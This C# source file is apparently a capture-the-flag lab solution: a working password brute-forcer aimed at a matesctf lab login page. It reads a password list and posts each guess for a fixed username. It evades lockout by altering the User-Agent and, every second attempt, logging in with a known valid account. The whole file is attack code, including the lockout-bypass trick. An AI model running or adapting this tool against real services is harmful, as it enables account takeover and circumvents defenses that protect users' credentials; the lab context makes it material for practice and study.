using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Web;
using System.Net;
using System.Text.RegularExpressions;
using System.Diagnostics;
using System.IO;
using System.IO.IsolatedStorage;
using System.Security.Cryptography;

namespace FuzzWebLab3_Blind1
{
    class Program
    {
        //public bool bruteForce(string pass)
        //{
        //    String uri = "https://labs.matesctf.org/lab/auth/3/index.php?page=login";
        //    System.IO.Stream stream;
        //    System.IO.StreamReader sr;
        //    String Out;

        //    Cookie ck = new Cookie("ASP.NET_SessionId", "hainhc");
        //    CookieContainer reqCookies = new CookieContainer();
        //    ck.Domain = "labs.matesctf.org";
        //    HttpWebRequest rq = (HttpWebRequest)WebRequest.Create(uri);
        //    rq.Method = "POST";
        //    rq.Timeout = 20000;
        //    rq.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36";
        //    rq.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*";
        //    rq.Headers.Add("Accept-Language", "vi-VN,vi;q=0.8,fr-FR;q=0.6,fr;q=0.4,en-US;q=0.2,en;q=0.2");
        //    rq.CookieContainer = reqCookies;
        //    rq.CookieContainer.Add(ck);
        //    byte[] data = new System.Text.ASCIIEncoding().GetBytes(pass);
        //    rq.ContentType = "application/x-www-form-urlencoded";
        //    rq.ContentLength = data.Length;
        //    System.IO.Stream postStream = rq.GetRequestStream();
        //    postStream.Write(data, 0, data.Length);
        //    postStream.Close();
        //    HttpWebResponse hr;
        //    hr = (HttpWebResponse)rq.GetResponse();
        //    stream = hr.GetResponseStream();
        //    sr = new System.IO.StreamReader(stream);
        //    Out = sr.ReadToEnd();
        //    if ((Out.IndexOf("<strong>username or password not correct</strong>") == -1) && (Out.IndexOf("Internal Server Error") == -1))
        //    {
        //        return true;
        //    }
        //    return false;
        //}
        static void Main(string[] args)
        {
            Random rnd = new Random();
            int rd = rnd.Next(1, 1000);
            int index = 0;

            int nUser = 0, nPass = 0 ;
            string lineUsername, linePassword, br;

            System.IO.StreamReader fPassword = new System.IO.StreamReader(@"passwords.txt");
            fPassword = new System.IO.StreamReader(@"passwords.txt");
            while ((linePassword = fPassword.ReadLine()) != null)
            {
                index++;
                if (index % 2 == 0)
                    obs();
                br = "username=arizona&password=" + linePassword;
                System.Console.WriteLine(br);
                rd = rnd.Next(1, 1000);
                if (bruteForce(br, rd))
                {
                    System.Console.WriteLine(linePassword);
                    Console.ReadKey();
                }
                nPass++;
            }
            //System.Console.WriteLine(lineUsername);
            fPassword.Close(); 
           
        }

        static bool bruteForce(string pass, int month)
        {
            String uri = "https://labs.matesctf.org/lab/auth/4/index.php?page=login";
            System.IO.Stream stream;
            System.IO.StreamReader sr;
            String Out;

            Cookie ck = new Cookie("ASP.NET_SessionId", "hainhcxxx");
            CookieContainer reqCookies = new CookieContainer();
            ck.Domain = "labs.matesctf.org";
            HttpWebRequest rq = (HttpWebRequest)WebRequest.Create(uri);
            rq.Method = "POST";
            rq.Timeout = 20000;
            rq.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36" + month.ToString();
            rq.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*";
            rq.Headers.Add("Accept-Language", "vi-VN,vi;q=0.8,fr-FR;q=0.6,fr;q=0.4,en-US;q=0.2,en;q=0.2");
            rq.CookieContainer = reqCookies;
            rq.CookieContainer.Add(ck);
            byte[] data = new System.Text.ASCIIEncoding().GetBytes(pass);
            rq.ContentType = "application/x-www-form-urlencoded";
            rq.ContentLength = data.Length;
            System.IO.Stream postStream = rq.GetRequestStream();
            postStream.Write(data, 0, data.Length);
            postStream.Close();
            HttpWebResponse hr;
            hr = (HttpWebResponse)rq.GetResponse();
            stream = hr.GetResponseStream();
            sr = new System.IO.StreamReader(stream);
            Out = sr.ReadToEnd();
            if ((Out.IndexOf("<strong>username or password not correct</strong>") == -1) && (Out.IndexOf("Internal Server Error") == -1)
                && (Out.IndexOf("<strong>username or password not match</strong>") == -1))
            {
                return true;
            }
            return false;
        }

        static bool obs()
        {
            String uri = "https://labs.matesctf.org/lab/auth/4/index.php?page=login";
            System.IO.Stream stream;
            System.IO.StreamReader sr;
            String Out;

            Cookie ck = new Cookie("ASP.NET_SessionId", "hainhcxxx");
            CookieContainer reqCookies = new CookieContainer();
            ck.Domain = "labs.matesctf.org";
            HttpWebRequest rq = (HttpWebRequest)WebRequest.Create(uri);
            rq.Method = "POST";
            rq.Timeout = 20000;
            rq.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36";
            rq.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*";
            rq.Headers.Add("Accept-Language", "vi-VN,vi;q=0.8,fr-FR;q=0.6,fr;q=0.4,en-US;q=0.2,en;q=0.2");
            rq.CookieContainer = reqCookies;
            rq.CookieContainer.Add(ck);
            byte[] data = new System.Text.ASCIIEncoding().GetBytes("username=armstrong&password=strongpow");
            rq.ContentType = "application/x-www-form-urlencoded";
            rq.ContentLength = data.Length;
            System.IO.Stream postStream = rq.GetRequestStream();
            postStream.Write(data, 0, data.Length);
            postStream.Close();
            HttpWebResponse hr;
            hr = (HttpWebResponse)rq.GetResponse();
            stream = hr.GetResponseStream();
            sr = new System.IO.StreamReader(stream);
            Out = sr.ReadToEnd();
            if ((Out.IndexOf("<strong>username or password not correct</strong>") == -1) && (Out.IndexOf("Internal Server Error") == -1)
                && (Out.IndexOf("<strong>username or password not match</strong>") == -1))
            {
                return true;
            }
            return false;
        }

    }
}
